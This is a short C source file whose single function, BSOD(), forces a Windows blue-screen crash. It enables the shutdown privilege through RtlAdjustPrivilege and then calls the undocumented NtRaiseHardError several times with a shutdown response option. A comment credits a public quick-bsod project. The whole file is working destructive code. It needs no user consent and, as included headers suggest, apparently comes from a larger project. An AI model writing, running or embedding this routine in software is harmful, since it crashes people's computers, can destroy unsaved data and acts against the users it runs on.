#include "shared.h"
#include "nt.h"

//The Org Function Code -> https://github.com/jpiechowka/quick-bsod/blob/master/src/QuickBSOD.cpp
//Blue Screen Of Death
void BSOD() {
	typedef NTSTATUS(NTAPI* TFNRtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
	typedef NTSTATUS(NTAPI* TFNNtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR* Parameters, ULONG ValidResponseOption, PULONG Response);
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");

	if (hNtdll != 0)
	{
		NTSTATUS s1, s2;
		BOOLEAN b;
		ULONG r;

		//Enable shutdown privilege
		//More https://msdn.microsoft.com/en-us/library/bb530716%28VS.85%29.aspx

		TFNRtlAdjustPrivilege pfnRtlAdjustPrivilege = (TFNRtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
		s1 = pfnRtlAdjustPrivilege(19, TRUE, FALSE, &b);

		//Cause BSOD
		//More about NtRaiseHardError here http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FError%2FNtRaiseHardError.html

		TFNNtRaiseHardError pfnNtRaiseHardError = (TFNNtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");
		s2 = pfnNtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &r);
		s2 = pfnNtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, &r);
		s2 = pfnNtRaiseHardError(0xC0000022, 0, 0, 0, 6, &r);
		
	}
	else {
		//pass
	}
}
